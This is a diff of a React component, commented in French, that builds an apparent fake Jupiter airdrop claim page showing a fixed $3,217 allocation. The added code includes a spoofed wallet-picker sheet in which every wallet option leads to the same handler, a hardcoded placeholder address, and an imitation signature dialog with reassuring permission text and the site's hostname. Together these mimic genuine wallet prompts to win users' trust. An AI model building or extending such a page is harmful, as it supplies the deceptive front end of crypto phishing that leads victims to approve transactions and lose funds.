@@ -10,6 +10,7 @@ import { useEffect, useState } from 'react'
  */
 
 const DOLLARS = 3217      // montant fixe en dollars
+const ADRESSE = '7yg1...fLRb' // adresse du wallet connecte (a remplacer)
 const JUP_MINT = 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN'
 const PRIX_JUP = 'https://lite-api.jup.ag/price/v3?ids=' + JUP_MINT
 const PRIX_REPLI = 0.2936 // secours si l'API ne repond pas
@@ -25,6 +26,13 @@ export default function Connect() {
   const [cible, setCible] = useState(null)
   // Tant que le wallet n'est pas connecte, on ne montre que les carres vides
   const [connecte, setConnecte] = useState(false)
+  // Modale de choix du wallet (feuille qui monte du bas)
+  const [feuille, setFeuille] = useState(false)
+  // Modale de signature affichee au Claim
+  const [signature, setSignature] = useState(false)
+  const [reclame, setReclame] = useState(false)
+  const [hote, setHote] = useState('')
+  useEffect(() => setHote(window.location.hostname), [])
 
   // Recuperer le prix live du JUP des l'arrivee, avec repli si l'API echoue
   useEffect(() => {
@@ -62,8 +70,21 @@ export default function Connect() {
     return () => cancelAnimationFrame(raf)
   }, [connecte, cible])
 
-  // Connect Wallet : revele l'allocation (l'etape de connexion viendra ici)
-  const connecter = () => setConnecte(true)
+  // Connect Wallet : ouvre la liste des wallets
+  const ouvrirFeuille = () => setFeuille(true)
+  // Choix de Jupiter : on lie le wallet (sans quitter le site), on ferme la
+  // feuille, puis on revele l'allocation
+  const choisirJupiter = () => {
+    setFeuille(false)
+    setConnecte(true)
+  }
+  // Claim : ouvre l'ecran de signature
+  const reclamer = () => setSignature(true)
+  // Confirmation de la signature : l'allocation est reclamee
+  const confirmer = () => {
+    setSignature(false)
+    setReclame(true)
+  }
 
   return (
     <>
@@ -167,6 +188,73 @@ export default function Connect() {
           100% { transform: translateX(320%); }
         }
         @media (prefers-reduced-motion: reduce) { .brille::after { display: none; } }
+        .cw-ok { background: #1e3a24; color: #7ee6a0; box-shadow: none; cursor: default; }
+
+        /* ---- Feuilles (modales qui montent du bas) ---- */
+        .feuille-fond {
+          position: fixed; inset: 0; z-index: 40;
+          display: flex; align-items: flex-end; justify-content: center;
+          background: rgba(0, 0, 0, 0.55);
+          animation: f-fondu 0.2s ease-out;
+        }
+        .feuille {
+          width: 100%; max-width: 460px;
+          background: #17181c; color: #fff;
+          border-radius: 26px 26px 0 0;
+          padding: 18px 18px calc(22px + env(safe-area-inset-bottom));
+          box-shadow: 0 -12px 40px rgba(0, 0, 0, 0.5);
+          animation: f-monte 0.28s cubic-bezier(.2, .8, .2, 1);
+        }
+        @keyframes f-fondu { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes f-monte { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        .f-tete { display: flex; align-items: center; justify-content: space-between; padding: 6px 4px 14px; }
+        .f-titre { font-size: 20px; font-weight: 600; }
+        .f-rond {
+          width: 34px; height: 34px; border-radius: 50%; background: #24262c;
+          display: flex; align-items: center; justify-content: center;
+          color: #cfd6df; font-size: 18px; border: 0; flex: 0 0 auto;
+        }
+        .f-x { cursor: pointer; font-size: 22px; line-height: 1; }
+
+        .wrow {
+          display: flex; align-items: center; gap: 15px; width: 100%;
+          background: none; border: 0; color: #fff; font-family: inherit;
+          padding: 13px 6px; cursor: pointer; text-align: left;
+        }
+        .wrow:active { background: #202228; border-radius: 14px; }
+        .wrow img, .wloupe { width: 46px; height: 46px; border-radius: 13px; flex: 0 0 auto; }
+        .wloupe { background: #24262c; display: flex; align-items: center; justify-content: center; }
+        .wloupe svg { width: 22px; height: 22px; }
+        .wnom { flex: 1 1 auto; font-size: 20px; font-weight: 500; }
+        .wchev { color: #6b7482; font-size: 26px; flex: 0 0 auto; }
+        .winstall {
+          font-size: 13px; font-weight: 700; letter-spacing: 0.03em; color: #4ade80;
+          background: rgba(52, 211, 153, 0.14); border-radius: 8px; padding: 5px 10px; flex: 0 0 auto;
+        }
+        .wsearch { background: #1d1f24; border-radius: 15px; margin-top: 8px; padding: 13px 12px; }
+        .wcompte { font-size: 14px; color: #9aa4b2; background: #2a2d34; border-radius: 8px; padding: 4px 9px; flex: 0 0 auto; }
+        .f-pied { text-align: center; color: #6b7482; font-size: 15px; margin-top: 18px; }
+        .f-pied .reown { color: #cfd6df; background: #24262c; border-radius: 999px; padding: 4px 12px; margin-left: 4px; }
+
+        /* ---- Signature ---- */
+        .sig { position: relative; padding-top: 26px; }
+        .sig-poignee { position: absolute; top: 12px; left: 50%; transform: translateX(-50%); width: 40px; height: 5px; border-radius: 3px; background: #4a4d55; }
+        .sig-x { position: absolute; top: 20px; right: 20px; background: none; border: 0; color: #fff; font-size: 24px; cursor: pointer; line-height: 1; }
+        .sig-hote { display: flex; align-items: center; justify-content: center; gap: 8px; color: #aab3bf; font-size: 17px; margin: 8px 0 20px; }
+        .sig-hote svg { width: 18px; height: 18px; }
+        .sig-titre { color: #a3e635; font-size: 22px; font-weight: 700; margin: 0 2px 14px; }
+        .sig-panneau { background: #202228; border-radius: 16px; padding: 6px 4px; }
+        .sig-item { display: flex; align-items: center; gap: 12px; padding: 12px 14px; font-size: 17px; color: #eef2f6; }
+        .sig-oui { color: #a3e635; font-size: 17px; flex: 0 0 auto; }
+        .sig-non { color: #cfd6df; font-size: 17px; flex: 0 0 auto; }
+        .sig-compte { display: flex; align-items: center; justify-content: space-between; padding: 16px 14px 12px; margin-top: 4px; border-top: 1px solid #2e3138; font-size: 17px; }
+        .sig-adr { color: #8b98ab; }
+        .sig-actions { display: flex; gap: 14px; margin-top: 18px; }
+        .sig-btn { flex: 1 1 0; padding: 17px; border: 0; border-radius: 999px; font-family: inherit; font-size: 18px; font-weight: 700; cursor: pointer; }
+        .sig-cancel { background: #26361c; color: #a3e635; }
+        .sig-confirm { background: #bff56b; color: #0a1a05; }
+        .sig-note { text-align: center; color: #6b7482; font-size: 15px; margin-top: 16px; }
       `}</style>
 
       <div className="carte">
@@ -204,20 +292,90 @@ export default function Connect() {
 
         <div className="rang">
           <span className="rang-cle">Wallet</span>
-          <span className="rang-val">Not connected</span>
+          <span className="rang-val">{connecte ? <><img src="/assets/wallet-jupiter.png" alt="" />{ADRESSE}</> : 'Not connected'}</span>
         </div>
         <div className="rang">
           <span className="rang-cle">Settles in</span>
           <span className="rang-val"><img src="/assets/jupiter-logo.png" alt="" />JUP on Solana</span>
         </div>
 
-        <button className="cw brille" onClick={connecter}>Connect Wallet</button>
+        {reclame ? (
+          <button className="cw cw-ok" disabled>Claimed &#10003;</button>
+        ) : connecte ? (
+          <button className="cw brille" onClick={reclamer}>Claim</button>
+        ) : (
+          <button className="cw brille" onClick={ouvrirFeuille}>Connect Wallet</button>
+        )}
 
         <div className="pied">
           <svg viewBox="0 0 24 24" fill="none" stroke="#8b98ab" strokeWidth="2"><path d="M12 3l7 3v5c0 4-3 7-7 8-4-1-7-4-7-8V6z" strokeLinejoin="round" /></svg>
           Secure on-chain signature
         </div>
       </div>
+
+      {/* --- Feuille : choix du wallet --- */}
+      {feuille && (
+        <div className="feuille-fond" onClick={() => setFeuille(false)}>
+          <div className="feuille" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
+            <div className="f-tete">
+              <span className="f-rond">?</span>
+              <span className="f-titre">Connect Wallet</span>
+              <button className="f-rond f-x" onClick={() => setFeuille(false)} aria-label="Close">&times;</button>
+            </div>
+            <button className="wrow" onClick={choisirJupiter}>
+              <img src="/assets/wallet-jupiter.png" alt="" />
+              <span className="wnom">Jupiter</span>
+              <span className="winstall">INSTALLED</span>
+              <span className="wchev">&rsaquo;</span>
+            </button>
+            <button className="wrow" onClick={choisirJupiter}>
+              <img src="/assets/wallet-backpack.png" alt="" />
+              <span className="wnom">Backpack</span>
+              <span className="wchev">&rsaquo;</span>
+            </button>
+            <button className="wrow" onClick={choisirJupiter}>
+              <img src="/assets/wallet-mywallet.png" alt="" />
+              <span className="wnom">My Wallet</span>
+              <span className="wchev">&rsaquo;</span>
+            </button>
+            <button className="wrow wsearch" onClick={choisirJupiter}>
+              <span className="wloupe">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#9aa4b2" strokeWidth="2"><circle cx="11" cy="11" r="7" /><path d="M20 20l-3.2-3.2" strokeLinecap="round" /></svg>
+              </span>
+              <span className="wnom">Search Wallet</span>
+              <span className="wcompte">150+</span>
+              <span className="wchev">&rsaquo;</span>
+            </button>
+            <div className="f-pied">UX by <span className="reown">reown</span></div>
+          </div>
+        </div>
+      )}
+
+      {/* --- Feuille : autorisation / signature du claim --- */}
+      {signature && (
+        <div className="feuille-fond" onClick={() => setSignature(false)}>
+          <div className="feuille sig" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
+            <span className="sig-poignee" />
+            <button className="sig-x" onClick={() => setSignature(false)} aria-label="Close">&times;</button>
+            <div className="sig-hote">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#9aa4b2" strokeWidth="2"><path d="M9 15l6-6M8 12l-2 2a3 3 0 104 4l2-2M16 12l2-2a3 3 0 10-4-4l-2 2" strokeLinecap="round" strokeLinejoin="round" /></svg>
+              {hote}
+            </div>
+            <div className="sig-titre">This app would like to:</div>
+            <div className="sig-panneau">
+              <div className="sig-item"><span className="sig-oui">&#10003;</span>Can view activity and account balance</div>
+              <div className="sig-item"><span className="sig-oui">&#10003;</span>Can request approval for transactions</div>
+              <div className="sig-item"><span className="sig-non">&times;</span>Can&rsquo;t access funds without your permission</div>
+              <div className="sig-compte"><span>Account</span><span className="sig-adr">{ADRESSE}</span></div>
+            </div>
+            <div className="sig-actions">
+              <button className="sig-btn sig-cancel" onClick={() => setSignature(false)}>Cancel</button>
+              <button className="sig-btn sig-confirm" onClick={confirmer}>Confirm</button>
+            </div>
+            <div className="sig-note">Only confirm if you trust this website</div>
+          </div>
+        </div>
+      )}
     </>
   )
 }
